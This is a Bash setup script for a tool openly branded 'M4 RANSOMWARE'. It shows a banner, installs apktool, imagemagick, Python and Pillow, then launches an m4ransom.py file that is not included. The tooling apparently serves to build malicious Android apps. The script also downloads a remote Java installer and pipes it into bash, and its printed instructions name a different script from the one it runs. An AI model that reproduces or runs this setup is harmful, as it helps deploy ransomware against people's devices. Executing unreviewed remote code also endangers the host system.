#! /usr/bin/bash
apt install figlet
clear
null="> /dev/null 2>&1"
g="\033[1;32m"
r="\033[1;31m"
b="\033[1;34m"
w="\033[0m"
figlet -f smslant     M4 -c
figlet -f smslant RANSOMWARE -c
declare -a colors=("\033[91m" "\033[92m" "\033[93m" "\033[94m" "\033[95m" "\033[96m")
declare -a earth=(
"                                      "
"⠀⠀⠀⠀⣿⠉⣉⣉⣉⣉⣉⣉⣉⣁⣈⣁⣈⣉⣉⣉⣉⣉⣉⣉⠉⣿⠀⠀⠀ "
"⠀⠀⠀⠀⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⠀⠀⠀⠀"
"⠀⠀⠀⠀⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⠀⠀⠀⠀"
"⠀⠀⠀⠀⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⠀⠀⠀⠀"
"⠀⠀⠀⠀⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⠀      Quien con demonios juega,⠀"
"⠀⠀⠀⠀⣿⣀⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣀⣿⠀⠀⠀debe cuidar no volverse uno."
"⠀⠀⠀⠀⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠀⠀⠀⠀"
"⠀⠀⠀⠀⣶⡖⠀⠶⠖⠀⠶⠆⠐⠶⠆⠰⠶⠂⠰⠶⠀⠲⠶⠀⢲⣶⠀⠀              ⠀⠀ BY M4LVOK SECURITY "
"⠀⠀⠀⢰⣿⠃⠐⠒⠂⠐⠒⠀⠒⠒⠂⠐⠒⠒⠀⠒⠂⠐⠒⠂⠘⣿⡆⠀                   ⠀⠀Version: 1.0 Spanish "
"⠀⠀⠀⣾⡿⠀⠛⠛⠀⠚⠛⠀⠚⠛⠃⠘⠛⠓⠀⠛⠓⠀⠛⠛⠀⢿⣷⠀⠀⠀                Fecha:04/09/2023 "
"⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⡏⢸⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀                 "
"⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⠀⠙⠛⠛⠛⠛⠛⠛⠋⠀⣿⣿⣿⣿⣿⣿⣿⣷⠀   "
"⠀⠀⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⠀⠀"

)  
# Set color to red
COLOR_RED='\033[0;31m'
COLOR_RESET='\033[0m'

# Imprimir el banner con color rojo
for line in "${earth[@]}"; do
    echo -e "${COLOR_RED}${line}${COLOR_RESET}"
done

figlet -f term ____________________________________ -c
echo "" 

echo -e $b">"$w" M4RAN Version en español"
echo -e $b">"$w" Preparando la instalacion de las dependencias..."
sleep 3
echo -e $b">"$w" installing package: "$g"wget"$w
apt-get install wget -y
clear
echo -e $b">"$w" installing package: "$g"curl"$w
apt-get install curl -y
clear
echo -e $b">"$w" installing package: "$g"apktool"$w
git clone https://github.com/Lexiie/Termux-Apktool
cd Termux-Apktool
dpkg -i apktool_2.3.4_all.deb
cd ..
apt-get install apktool -y
clear
echo -e $b">"$w" installing package: "$g"imagemagick"$w
apt-get install imagemagick -y
clear
echo -e $b">"$w" installing package: "$g"java"$w
wget https://raw.githubusercontent.com/MasterDevX/java/master/installjava && bash installjava
clear
echo -e $b">"$w" installing pacakge: "$g"python3"$w
apt-get install python3
clear
echo -e $b">"$w" installing modules: "$g"pillow"$w
pip3 install Pillow
clear
echo -e $b">"$w" successfully installing dependencies"
echo -e $b">"$w" use command "$g"python3 xransom.py"$w" for start the console"
python3 m4ransom.py
